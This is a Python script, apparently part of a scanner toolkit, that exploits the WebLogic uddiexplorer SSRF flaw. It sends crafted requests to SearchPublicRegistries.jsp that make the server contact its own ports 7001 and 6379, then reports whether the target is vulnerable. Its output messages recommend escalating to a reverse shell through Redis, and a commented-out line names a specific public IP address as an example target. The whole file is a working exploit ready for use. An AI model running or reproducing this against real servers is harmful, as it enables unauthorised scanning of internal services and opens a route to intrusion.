#coding:utf-8
import sys
import requests
#import random_str
import time
sys.path.insert(0,'../')
from config import random_str
from config import config

def exp_weblogic_ssrf(url):
    ceye_dns = config.ceye_dns
    """
    拼接url
    """
    if "://" in url:
        tmp_url = url
        sign = tmp_url.split("//", 1)[1]
        if "/" in sign:
            if sign.split("/", 1)[1]:
                sign = sign.split("/", 1)[1]
                target_url = tmp_url.split(sign, 1)[0]
            else:
                target_url = tmp_url
        else:
            target_url = tmp_url + "/"
    else:
        tmp_url = "http://" + url
        sign = tmp_url.split("//", 1)[1]
        if "/" in sign:
            if sign.split("/", 1)[1]:
                sign = sign.split("/", 1)[1]
                target_url = tmp_url.split(sign, 1)[0]
            else:
                target_url = tmp_url
        else:
            target_url = tmp_url + "/"
    if ":" in target_url.split("://",1)[1]:
        sign = target_url.split("://",1)[1].split(":",1)[1]
        target_url = target_url.split(sign,1)[0].rstrip(":")
    else:
        target_url = target_url.rstrip("/")
    target_url = target_url + ":7001"
    #print(target_url)   #查看target_url拼接情况
    """
    配置payload
    """
    proxies = config.proxies
    random_s = random_str.random_str()
    payload1 = "/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001"
    payload2 = "/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:6379"
    target_url1 = target_url + payload1
    target_url2 = target_url + payload2
    #requests.post(target_url,data=payload,headers=headers,proxies=proxies)
    """
    验证漏洞
    """
    try:
        response1 = requests.get(target_url1).text
        response2 = requests.get(target_url2).text
    except:
        print(url + "  不存在WebLogic-SSRF漏洞,目标没有开放7001端口")
        return None
    if "error code" in response1 and "error code" in response2:
        print(url + "  存在WebLogic-SSRF漏洞,同时6379端口开放，可以进一步测试通过redis来反弹shell")
    elif "error code" in response1 and "error code" not in response2:
        print(url + "  存在WebLogic-SSRF漏洞,未开放6379，可探测其他主机是否开放")
    else:
        print(url + "  不存在WebLogic-SSRF漏洞")


# exp_weblogic_ssrf("http://47.106.8.213:7001/console/login/LoginForm.jsp")